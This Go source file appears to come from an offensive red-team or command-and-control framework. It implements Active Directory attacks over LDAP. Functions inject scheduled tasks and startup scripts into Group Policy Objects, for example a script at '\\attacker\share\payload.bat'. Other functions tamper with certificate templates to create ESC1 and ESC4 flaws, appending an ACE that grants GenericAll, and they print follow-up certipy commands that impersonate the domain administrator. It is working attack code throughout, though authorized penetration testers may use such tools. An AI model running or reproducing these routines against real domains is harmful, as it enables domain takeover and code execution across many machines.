package commands

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

// ldapGPOAddTask adds a scheduled task to a GPO's gPCMachineExtensionNames and
// modifies the GPO's version to force client-side extension processing.
// This is the "GPO Abuse" attack: with write access to a GPO, inject a scheduled
// task that executes on all machines where the GPO is applied.
// MITRE ATT&CK: T1484.001 (Domain Policy Modification: Group Policy Modification)
func ldapGPOAddTask(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target is required (GPO display name or DN)")
	}
	if args.Value == "" {
		return errorResult("Error: -value is required (scheduled task XML or command to execute)")
	}

	// Resolve GPO DN
	gpoDN, err := resolveGPODN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving GPO: %v", err)
	}

	// Read current GPO attributes
	searchReq := ldap.NewSearchRequest(
		gpoDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 0, false,
		"(objectClass=groupPolicyContainer)",
		[]string{"gPCMachineExtensionNames", "versionNumber", "displayName"},
		nil,
	)
	sr, err := conn.Search(searchReq)
	if err != nil || len(sr.Entries) == 0 {
		return errorf("Error reading GPO %s: %v", gpoDN, err)
	}
	entry := sr.Entries[0]

	displayName := entry.GetAttributeValue("displayName")
	currentExtNames := entry.GetAttributeValue("gPCMachineExtensionNames")
	versionStr := entry.GetAttributeValue("versionNumber")

	// Scheduled Task CSE GUID: {00000000-0000-0000-0000-000000000000}
	// Task Scheduler Extension: {CAB54552-DEEA-4691-817E-ED4A4D1AFC72}
	// Preference CSE: {AADCED64-746C-4633-A97C-D61349046527}
	schedTaskCSE := "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
	prefCSE := "[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"

	// Append CSE GUIDs if not already present
	newExtNames := currentExtNames
	if !strings.Contains(newExtNames, "CAB54552-DEEA-4691-817E-ED4A4D1AFC72") {
		newExtNames += schedTaskCSE + prefCSE
	}

	// Build modification request
	modReq := ldap.NewModifyRequest(gpoDN, nil)
	modReq.Replace("gPCMachineExtensionNames", []string{newExtNames})

	// Increment version number to force GPO reprocessing
	var version int
	_, _ = fmt.Sscanf(versionStr, "%d", &version)
	// Machine version is the lower 16 bits — increment it
	machineVersion := version & 0xFFFF
	userVersion := (version >> 16) & 0xFFFF
	newVersion := (userVersion << 16) | (machineVersion + 1)
	modReq.Replace("versionNumber", []string{fmt.Sprintf("%d", newVersion)})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error modifying GPO: %v", err)
	}

	return successf("GPO task injection prepared:\n  GPO:      %s (%s)\n  DN:       %s\n  Command:  %s\n  Version:  %d → %d (machine version incremented)\n  CSE:      Scheduled Task Extension added\n\n  IMPORTANT: You must also write the scheduled task XML to SYSVOL:\n    \\\\<domain>\\SYSVOL\\<domain>\\Policies\\<GUID>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n  Use 'smb -action push' to write the XML file to the SYSVOL share.",
		displayName, args.Target, gpoDN, args.Value, version, newVersion)
}

// ldapGPOAddScript modifies a GPO to add a startup/logon script path.
// Modifies gPCMachineExtensionNames and the GPO version to trigger reprocessing.
func ldapGPOAddScript(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target is required (GPO display name or DN)")
	}
	if args.Value == "" {
		return errorResult("Error: -value is required (script path, e.g., \\\\attacker\\share\\payload.bat)")
	}

	gpoDN, err := resolveGPODN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving GPO: %v", err)
	}

	searchReq := ldap.NewSearchRequest(
		gpoDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 0, false,
		"(objectClass=groupPolicyContainer)",
		[]string{"gPCMachineExtensionNames", "versionNumber", "displayName"},
		nil,
	)
	sr, err := conn.Search(searchReq)
	if err != nil || len(sr.Entries) == 0 {
		return errorf("Error reading GPO: %v", err)
	}
	entry := sr.Entries[0]

	displayName := entry.GetAttributeValue("displayName")
	currentExtNames := entry.GetAttributeValue("gPCMachineExtensionNames")
	versionStr := entry.GetAttributeValue("versionNumber")

	// Scripts CSE GUID: {42B5FAAE-6536-11D2-AE5A-0000F87571E3}
	// Tool extension: {40B6664F-4972-11D1-A7CA-0000F87571E3}
	scriptsCSE := "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"

	newExtNames := currentExtNames
	if !strings.Contains(newExtNames, "42B5FAAE-6536-11D2-AE5A-0000F87571E3") {
		newExtNames += scriptsCSE
	}

	modReq := ldap.NewModifyRequest(gpoDN, nil)
	modReq.Replace("gPCMachineExtensionNames", []string{newExtNames})

	var version int
	_, _ = fmt.Sscanf(versionStr, "%d", &version)
	machineVersion := version & 0xFFFF
	userVersion := (version >> 16) & 0xFFFF
	newVersion := (userVersion << 16) | (machineVersion + 1)
	modReq.Replace("versionNumber", []string{fmt.Sprintf("%d", newVersion)})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error modifying GPO: %v", err)
	}

	return successf("GPO script injection prepared:\n  GPO:      %s (%s)\n  DN:       %s\n  Script:   %s\n  Version:  %d → %d\n  CSE:      Scripts Extension added\n\n  IMPORTANT: Write scripts.ini to SYSVOL:\n    \\\\<domain>\\SYSVOL\\<domain>\\Policies\\<GUID>\\Machine\\Scripts\\Startup\\scripts.ini\n  Format: [Startup]\\n0CmdLine=%s\\n0Parameters=\n  Use 'smb -action push' to write the ini file.",
		displayName, args.Target, gpoDN, args.Value, version, newVersion, args.Value)
}

// ldapTemplateESC1 modifies a certificate template to enable ESC1 (Client Auth + SAN).
// Sets the template to allow requesters to specify Subject Alternative Names and
// enables Client Authentication EKU. This is the most impactful ADCS misconfiguration.
// MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates)
func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target is required (certificate template CN)")
	}

	templateDN := fmt.Sprintf("CN=%s,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,%s", args.Target, baseDN)

	// Read current template attributes
	searchReq := ldap.NewSearchRequest(
		templateDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 0, false,
		"(objectClass=pKICertificateTemplate)",
		[]string{"msPKI-Certificate-Name-Flag", "pKIExtendedKeyUsage", "msPKI-Template-Schema-Version", "displayName"},
		nil,
	)
	sr, err := conn.Search(searchReq)
	if err != nil || len(sr.Entries) == 0 {
		return errorf("Error reading certificate template '%s': %v\n  DN: %s", args.Target, err, templateDN)
	}
	entry := sr.Entries[0]

	displayName := entry.GetAttributeValue("displayName")
	if displayName == "" {
		displayName = args.Target
	}

	currentNameFlag := entry.GetAttributeValue("msPKI-Certificate-Name-Flag")
	currentEKUs := entry.GetAttributeValues("pKIExtendedKeyUsage")

	// CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1 — allows requester to set SAN
	var nameFlag int
	_, _ = fmt.Sscanf(currentNameFlag, "%d", &nameFlag)
	originalFlag := nameFlag
	nameFlag |= 0x1 // Set ENROLLEE_SUPPLIES_SUBJECT

	// Client Authentication EKU: 1.3.6.1.5.5.7.3.2
	clientAuthEKU := "1.3.6.1.5.5.7.3.2"
	hasClientAuth := false
	for _, eku := range currentEKUs {
		if eku == clientAuthEKU {
			hasClientAuth = true
			break
		}
	}

	modReq := ldap.NewModifyRequest(templateDN, nil)

	// Set ENROLLEE_SUPPLIES_SUBJECT flag
	modReq.Replace("msPKI-Certificate-Name-Flag", []string{fmt.Sprintf("%d", nameFlag)})

	// Add Client Authentication EKU if not present
	if !hasClientAuth {
		newEKUs := append(currentEKUs, clientAuthEKU)
		modReq.Replace("pKIExtendedKeyUsage", newEKUs)
	}

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error modifying certificate template: %v", err)
	}

	var sb strings.Builder
	sb.WriteString("ESC1 vulnerability injected into certificate template:\n")
	sb.WriteString(fmt.Sprintf("  Template:  %s\n", displayName))
	sb.WriteString(fmt.Sprintf("  DN:        %s\n", templateDN))
	sb.WriteString(fmt.Sprintf("  Name Flag: %d → %d (ENROLLEE_SUPPLIES_SUBJECT set)\n", originalFlag, nameFlag))
	if !hasClientAuth {
		sb.WriteString("  EKU:       Added Client Authentication (1.3.6.1.5.5.7.3.2)\n")
	} else {
		sb.WriteString("  EKU:       Client Authentication already present\n")
	}
	sb.WriteString("\n  Attack: Request a certificate for any user:\n")
	sb.WriteString(fmt.Sprintf("    certipy req -u attacker -p pass -ca <CA> -template %s -upn administrator@domain.local\n", args.Target))
	sb.WriteString(fmt.Sprintf("\n  Rollback: Use 'ldap-write -action template-esc1-revert -target %s' to restore original values", args.Target))

	return successResult(sb.String())
}

// ldapTemplateESC4 modifies template permissions to allow a principal to enroll and
// modify the template. ESC4 = excessive permissions on cert template object.
// MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates)
func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target is required (certificate template CN)")
	}
	if args.Value == "" {
		return errorResult("Error: -value is required (principal SID or sAMAccountName to grant access)")
	}

	templateDN := fmt.Sprintf("CN=%s,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,%s", args.Target, baseDN)

	// Resolve principal to SID
	principalSID, err := resolveToSID(conn, args.Value, baseDN)
	if err != nil {
		return errorf("Error resolving principal '%s': %v", args.Value, err)
	}

	// Read current nTSecurityDescriptor
	searchReq := ldap.NewSearchRequest(
		templateDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 0, false,
		"(objectClass=pKICertificateTemplate)",
		[]string{"nTSecurityDescriptor", "displayName"},
		[]ldap.Control{&ldap.ControlString{
			ControlType:  "1.2.840.113556.1.4.801", // LDAP_SERVER_SD_FLAGS_OID
			ControlValue: string([]byte{0x30, 0x03, 0x02, 0x01, 0x04}), // DACL only
			Criticality:  true,
		}},
	)
	sr, err := conn.Search(searchReq)
	if err != nil || len(sr.Entries) == 0 {
		return errorf("Error reading template security descriptor: %v", err)
	}
	entry := sr.Entries[0]
	displayName := entry.GetAttributeValue("displayName")
	if displayName == "" {
		displayName = args.Target
	}

	currentSD := entry.GetRawAttributeValue("nTSecurityDescriptor")
	if len(currentSD) == 0 {
		return errorResult("Error: cannot read nTSecurityDescriptor — insufficient privileges")
	}

	// Build ACE for GenericAll (0x10000000) + Enroll (0x00000004)
	// This is a simplified approach — adds an ALLOW ACE to the DACL
	accessMask := uint32(0x000F01FF) // GENERIC_ALL equivalent for AD objects
	ace := buildAllowACE(principalSID, accessMask)

	// Append ACE to existing DACL
	newSD := appendACEToDACL(currentSD, ace)
	if newSD == nil {
		return errorResult("Error: could not parse security descriptor to add ACE")
	}

	modReq := ldap.NewModifyRequest(templateDN, []ldap.Control{
		&ldap.ControlString{
			ControlType:  "1.2.840.113556.1.4.801",
			ControlValue: string([]byte{0x30, 0x03, 0x02, 0x01, 0x04}),
			Criticality:  true,
		},
	})
	modReq.Replace("nTSecurityDescriptor", []string{string(newSD)})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error modifying template ACL: %v", err)
	}

	return successf("ESC4: Granted full control on certificate template:\n  Template:   %s\n  DN:         %s\n  Principal:  %s (SID: %s)\n  Rights:     GenericAll + Enroll\n\n  Attack: Modify the template for ESC1, then request certs as any user.\n  Use 'ldap-write -action template-esc1 -target %s' to set up ESC1.",
		displayName, templateDN, args.Value, formatSID(principalSID), args.Target)
}

// resolveGPODN resolves a GPO display name to its DN.
func resolveGPODN(conn *ldap.Conn, nameOrDN, baseDN string) (string, error) {
	if strings.Contains(nameOrDN, "=") {
		return nameOrDN, nil
	}

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 1, 0, false,
		fmt.Sprintf("(&(objectClass=groupPolicyContainer)(displayName=%s))", ldap.EscapeFilter(nameOrDN)),
		[]string{"dn"},
		nil,
	)
	sr, err := conn.Search(searchReq)
	if err != nil {
		return "", fmt.Errorf("LDAP search error: %w", err)
	}
	if len(sr.Entries) == 0 {
		return "", fmt.Errorf("GPO '%s' not found", nameOrDN)
	}
	return sr.Entries[0].DN, nil
}

// resolveToSID resolves a sAMAccountName or SID string to a binary SID.
func resolveToSID(conn *ldap.Conn, nameOrSID, baseDN string) ([]byte, error) {
	// If it looks like a SID string (S-1-5-...), parse it
	if strings.HasPrefix(nameOrSID, "S-1-") {
		return parseSIDString(nameOrSID)
	}

	// Resolve by sAMAccountName
	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 1, 0, false,
		fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(nameOrSID)),
		[]string{"objectSid"},
		nil,
	)
	sr, err := conn.Search(searchReq)
	if err != nil {
		return nil, fmt.Errorf("search error: %w", err)
	}
	if len(sr.Entries) == 0 {
		return nil, fmt.Errorf("'%s' not found", nameOrSID)
	}
	sid := sr.Entries[0].GetRawAttributeValue("objectSid")
	if len(sid) == 0 {
		return nil, fmt.Errorf("no objectSid for '%s'", nameOrSID)
	}
	return sid, nil
}

// parseSIDString parses a SID string (S-1-5-21-...) into binary format.
func parseSIDString(s string) ([]byte, error) {
	parts := strings.Split(s, "-")
	if len(parts) < 3 || parts[0] != "S" {
		return nil, fmt.Errorf("invalid SID: %s", s)
	}

	var revision uint8
	_, _ = fmt.Sscanf(parts[1], "%d", &revision)

	var authority uint64
	_, _ = fmt.Sscanf(parts[2], "%d", &authority)

	subAuthCount := len(parts) - 3
	sid := make([]byte, 8+4*subAuthCount)
	sid[0] = revision
	sid[1] = byte(subAuthCount)
	// Authority is big-endian 6 bytes
	sid[2] = byte(authority >> 40)
	sid[3] = byte(authority >> 32)
	sid[4] = byte(authority >> 24)
	sid[5] = byte(authority >> 16)
	sid[6] = byte(authority >> 8)
	sid[7] = byte(authority)

	for i := 0; i < subAuthCount; i++ {
		var subAuth uint32
		_, _ = fmt.Sscanf(parts[3+i], "%d", &subAuth)
		binary.LittleEndian.PutUint32(sid[8+4*i:], subAuth)
	}

	return sid, nil
}

// formatSID converts a binary SID to string format (S-1-5-21-...).
func formatSID(sid []byte) string {
	if len(sid) < 8 {
		return hex.EncodeToString(sid)
	}
	revision := sid[0]
	subAuthCount := int(sid[1])
	authority := uint64(sid[2])<<40 | uint64(sid[3])<<32 | uint64(sid[4])<<24 |
		uint64(sid[5])<<16 | uint64(sid[6])<<8 | uint64(sid[7])

	result := fmt.Sprintf("S-%d-%d", revision, authority)
	for i := 0; i < subAuthCount && 8+4*i+4 <= len(sid); i++ {
		subAuth := binary.LittleEndian.Uint32(sid[8+4*i:])
		result += fmt.Sprintf("-%d", subAuth)
	}
	return result
}

// buildAllowACE creates an ACCESS_ALLOWED_ACE for the given SID and access mask.
func buildAllowACE(sid []byte, accessMask uint32) []byte {
	aceSize := 4 + 4 + len(sid) // header(4) + mask(4) + SID
	ace := make([]byte, aceSize)
	ace[0] = 0x00 // ACCESS_ALLOWED_ACE_TYPE
	ace[1] = 0x02 // CONTAINER_INHERIT_ACE
	binary.LittleEndian.PutUint16(ace[2:], uint16(aceSize))
	binary.LittleEndian.PutUint32(ace[4:], accessMask)
	copy(ace[8:], sid)
	return ace
}

// appendACEToDACL appends an ACE to the DACL in a security descriptor.
// Returns nil if the SD cannot be parsed.
func appendACEToDACL(sd, ace []byte) []byte {
	if len(sd) < 20 {
		return nil
	}

	// SD header: Revision(1), Sbz1(1), Control(2), OffsetOwner(4), OffsetGroup(4),
	//            OffsetSacl(4), OffsetDacl(4) = 20 bytes
	daclOffset := binary.LittleEndian.Uint32(sd[16:20])
	if daclOffset == 0 || int(daclOffset) >= len(sd) {
		return nil
	}

	// DACL header: AclRevision(1), Sbz1(1), AclSize(2), AceCount(2), Sbz2(2) = 8 bytes
	dacl := sd[daclOffset:]
	if len(dacl) < 8 {
		return nil
	}

	aclSize := binary.LittleEndian.Uint16(dacl[2:4])
	aceCount := binary.LittleEndian.Uint16(dacl[4:6])

	// Build new SD: everything before DACL + expanded DACL + everything after
	newAclSize := int(aclSize) + len(ace)
	newSD := make([]byte, len(sd)+len(ace))
	copy(newSD, sd[:daclOffset])

	// Copy DACL header with updated size and count
	copy(newSD[daclOffset:], dacl[:8])
	binary.LittleEndian.PutUint16(newSD[daclOffset+2:], uint16(newAclSize))
	binary.LittleEndian.PutUint16(newSD[daclOffset+4:], aceCount+1)

	// Copy existing ACEs
	existingACEs := dacl[8:aclSize]
	dOff := int(daclOffset)
	copy(newSD[dOff+8:], existingACEs)

	// Append new ACE
	copy(newSD[dOff+8+len(existingACEs):], ace)

	// Copy anything after the DACL
	afterDACL := dOff + int(aclSize)
	if afterDACL < len(sd) {
		copy(newSD[dOff+newAclSize:], sd[afterDACL:])
	}

	return newSD
}
